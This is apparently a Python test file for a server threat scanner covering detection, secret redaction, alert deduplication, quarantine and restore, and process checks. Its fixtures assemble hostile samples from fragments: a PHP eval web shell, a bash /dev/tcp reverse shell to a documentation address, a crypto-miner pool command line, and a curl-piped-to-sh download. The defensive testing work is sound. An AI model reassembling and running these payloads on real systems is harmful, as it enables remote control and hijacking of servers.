"""Threat scan: signatures, privacy, raising each finding once, quarantine and restore, process flags.

Sample payloads are assembled from pieces so this file itself never holds a working web shell or
miner command line (antivirus on a developer's machine would otherwise quarantine the test).
"""

import json
import zipfile
from pathlib import Path

import pytest
from app import procscan, threatscan
from app.threats import ThreatWatch

from .conftest import AUTH  # noqa: F401  (client fixture sends it)

EV = "ev" + "al"
WEBSHELL = f"<?php @{EV}($_POST['cmd']); ?>\n"
ENCODED = f"<?php {EV}(base64" + "_decode('ZWNobyAxOw==')); ?>\n"
REVSHELL = "#!/bin/bash\nbash -i >& /dev/" + "tcp/203.0.113.9/4444 0>&1\n"
MINER = "#!/bin/sh\n./sys -o stratum" + "+tcp://pool.example:3333 -u wallet --donate-level 1\n"
HARBOR = "curl -LO https://dl-cdn.alpinelinux.org/alpine/v3.20/releases/x86_64/alpine-mini" + "rootfs-3.20.0.tar.gz\n"
CLEAN_PHP = "<?php echo htmlspecialchars($_GET['q'] ?? ''); ?>\n"
CLEAN_JS = "const r = await fetch('/api'); console.log(JSON.stringify(r));\n"


@pytest.fixture
def server(tmp_path, monkeypatch):
    """A game host with a few servers: some clean files, some planted ones."""
    monkeypatch.setenv("CACTAI_THREAT_STATE", str(tmp_path / "state" / "seen.json"))
    monkeypatch.setenv("CACTAI_QUARANTINE", str(tmp_path / "state" / "quarantine"))
    monkeypatch.setattr(procscan, "_homes", lambda: [str(tmp_path / "home" / "erick")])
    vol = tmp_path / "volumes"
    a = vol / "a1" / "plugins" / "web" / "upload"
    a.mkdir(parents=True)
    (a / "img.php").write_text(WEBSHELL)
    (a / "index.php").write_text(CLEAN_PHP)
    b = vol / "b2"
    (b / "tmp").mkdir(parents=True)
    (b / "tmp" / "start.sh").write_text(MINER)                 # tmp/ is not skipped
    (b / "config.yml").write_text("motd: hi\n" + HARBOR)       # nor is config.yml
    (b / "bot.js").write_text(CLEAN_JS)
    (b / "node_modules" / "x").mkdir(parents=True)
    (b / "node_modules" / "x" / "evil.js").write_text(WEBSHELL)  # package caches are skipped
    (b / "app.min.js").write_text(WEBSHELL)                    # and so are minified bundles
    c = vol / "c3"
    c.mkdir()
    (c / "run").write_text(REVSHELL)                           # extensionless script with a shebang
    (c / "notes").write_text("bash -i >& /dev/" + "tcp/1.2.3.4/1 0>&1\n")  # no shebang: not read
    (c / "decoder.php").write_text(ENCODED)
    with zipfile.ZipFile(c / "plugin.jar", "w") as z:
        z.writestr("plugin.yml", "name: Fine\n")
        z.writestr("a/B.class", b"\xca\xfe\xba\xbe\x00\x01stratum" + b"+tcp://pool.example:1\x00")
        z.writestr("a/C.class", b"\xca\xfe\xba\xbe Runtime.getRuntime().exec base64")  # normal plugin stuff
    return vol


def keys(result):
    return {(Path(f["path"]).name, f["key"]) for f in result["findings"]}


def test_finds_planted_files_and_skips_clean_ones(server):
    r = threatscan.scan([str(server)])
    found = keys(r)
    assert ("img.php", "php-eval-request") in found
    assert ("start.sh", "miner-pool") in found
    assert ("config.yml", "minirootfs") in found
    assert ("run", "bash-dev-tcp") in found
    assert ("decoder.php", "php-eval-decoded") in found
    assert ("plugin.jar", "miner-pool") in found
    names = {n for n, _ in found}
    assert not names & {"index.php", "bot.js", "evil.js", "app.min.js", "notes"}
    jar = next(f for f in r["findings"] if f["path"].endswith("plugin.jar"))
    assert jar["entry"] == "a/B.class"
    assert r["counts"]["critical"] >= 5
    assert r["findings"][0]["severity"] == "critical"  # most serious first


def test_allow_list_and_known_bad_hash(server):
    import hashlib
    r = threatscan.scan([str(server)], {"allow": ["*/a1/plugins/web/*"]})
    assert "img.php" not in {n for n, _ in keys(r)}
    digest = hashlib.sha256(CLEAN_JS.encode()).hexdigest()
    r = threatscan.scan([str(server)], {"known_bad_sha256": [digest]})
    assert ("bot.js", "known-bad-hash") in keys(r)


def test_sentrai_own_folders_are_never_scanned():
    r = threatscan.scan([str(threatscan.MVP_DIR)])
    assert r["files_checked"] == 0 and r["findings"] == []


def test_snippets_hide_homes_and_secrets(tmp_path, monkeypatch):
    home = tmp_path / "home" / "erick"
    monkeypatch.setattr(procscan, "_homes", lambda: [str(home)])
    site = home / "site"
    site.mkdir(parents=True)
    (site / "x.sh").write_text(f"curl -H 'token=abc123' https://get.example/i.sh | sh  # {home}/x\n")
    r = threatscan.scan([str(site)])
    f = r["findings"][0]
    assert f["path"].startswith("~") and str(home) not in f["snippet"]
    assert "abc123" not in f["snippet"]
    assert str(home) not in json.dumps(ThreatWatch.public(r))


class FakeScribe:
    def __init__(self):
        self.records = []

    def record(self, agent, rtype, data):
        self.records.append((rtype, data))


class FakeClock:
    def now_iso(self):
        return "2026-10-07T12:00:00"


class FakeCore:
    name = "Cyanide"

    def __init__(self, paths):
        self.profile = {"threat_scan": {"paths": paths, "every_minutes": 30}}
        self.scribe, self.clock, self.ingested = FakeScribe(), FakeClock(), []

    def ingest(self, events):
        self.ingested += events


def test_each_finding_is_raised_once(server):
    core = FakeCore([str(server)])
    w = ThreatWatch(core)
    assert w.every_s() == 1800
    first = w.scan("test")
    assert first["new_alerts"] == len(core.ingested) > 0
    assert all(e["source"] == "threat_scan" and e["src_ip"] is None for e in core.ingested)
    assert "real_path" not in json.dumps(first)
    again = w.scan("test")
    assert again["new_alerts"] == 0 and len(core.ingested) == first["new_alerts"]
    (server / "c3" / "run").write_text(REVSHELL + "# changed\n")  # new contents: a new finding
    assert w.scan("test")["new_alerts"] == 1
    assert core.scribe.records[-1][0] == "threat_scan"


def test_quarantine_and_restore(server):
    core = FakeCore([str(server)])
    w = ThreatWatch(core)
    r = w.scan("test")
    fid = next(f["id"] for f in r["findings"] if f["path"].endswith("img.php"))
    with pytest.raises(KeyError):
        w.quarantine("t999", "erick")
    out = w.quarantine(fid, "erick", "web shell in uploads")
    target = server / "a1" / "plugins" / "web" / "upload" / "img.php"
    assert not target.exists()
    held = w.quarantined()
    assert len(held) == 1 and held[0]["finding"]["key"] == "php-eval-request"
    w.restore(out["quarantine_id"], "erick")
    assert target.read_text() == WEBSHELL and w.quarantined() == []
    with pytest.raises(KeyError):
        w.restore("../../etc/passwd", "erick")
    assert [t for t, _ in core.scribe.records].count("file_quarantined") == 1


def test_quarantine_refuses_a_changed_file(server):
    w = ThreatWatch(FakeCore([str(server)]))
    r = w.scan("test")
    f = next(f for f in r["findings"] if f["path"].endswith("start.sh"))
    (server / "b2" / "tmp" / "start.sh").write_text("echo fine\n")
    with pytest.raises(ValueError, match="changed"):
        w.quarantine(f["id"], "erick")


def test_no_folders_means_no_scan(monkeypatch):
    monkeypatch.delenv("CACTAI_THREAT_PATHS", raising=False)
    core = FakeCore([])
    w = ThreatWatch(core)
    assert w.every_s() == 0
    assert "No folders" in w.scan()["note"]
    monkeypatch.setenv("CACTAI_THREAT_PATHS", "/nonexistent-a")
    assert w.config()["paths"] == ["/nonexistent-a"]


def test_process_scan_flags_hostile_programs():
    P = procscan.Proc
    procs = [
        P(10, "xmrig", "/tmp/.x/xmrig", ["/tmp/.x/xmrig", "-o", "stratum" + "+tcp://pool.example:3333"], "mc"),
        P(11, "bash", "/usr/bin/bash", ["bash", "-c", "bash -i >& /dev/" + "tcp/203.0.113.9/4444 0>&1"], "www-data"),
        P(12, "java", "/usr/bin/java", ["java", "-jar", "server.jar"], "mc"),
        P(13, "kworker", "/dev/shm/kworker (deleted)", ["kworker"], "mc"),
    ]
    r = procscan.scan({}, set(), system="Linux", processes=procs)
    by_pid = {}
    for t in r["threats"]:
        by_pid.setdefault(t["pid"], set()).add(t["key"])
    assert {"miner-name", "miner-pool", "tmp-exe"} <= by_pid[10]
    assert "bash-dev-tcp" in by_pid[11]
    assert 12 not in by_pid
    assert {"tmp-exe", "deleted-exe"} <= by_pid[13]
    assert "203.0.113.9" not in json.dumps([t for t in r["threats"] if t["pid"] == 11 and "cmdline" in t])


def test_api_scan_opens_one_malware_incident_and_quarantines(client, server):
    r = client.post("/threats/scan", json={"operator": "erick", "paths": [str(server)]})
    assert r.status_code == 200, r.text
    body = r.json()
    assert body["new_alerts"] > 0
    incs = [i for i in client.get("/incidents").json() if i["category"] == "malware"]
    assert len(incs) == 1 and incs[0]["severity"] == "critical"
    assert incs[0]["status"] != "contained"  # a person decides; nothing runs on its own
    assert "threat scan found" in client.get(f"/incidents/{incs[0]['id']}").json()["explanation"]
    fid = body["findings"][0]["id"]
    q = client.post(f"/threats/{fid}/quarantine", json={"operator": "erick"})
    assert q.status_code == 200, q.text
    assert client.post(f"/threats/{fid}/quarantine", json={"operator": "erick"}).status_code == 409
    held = client.get("/quarantine").json()
    assert len(held) == 1
    assert client.post(f"/quarantine/{held[0]['id']}/restore", json={"operator": "erick"}).status_code == 200
    assert client.get("/threats").json()["findings"]
    types = {r["type"] for r in client.core.audit.records()}
    assert {"threat_scan", "file_quarantined", "file_restored", "incident_opened"} <= types
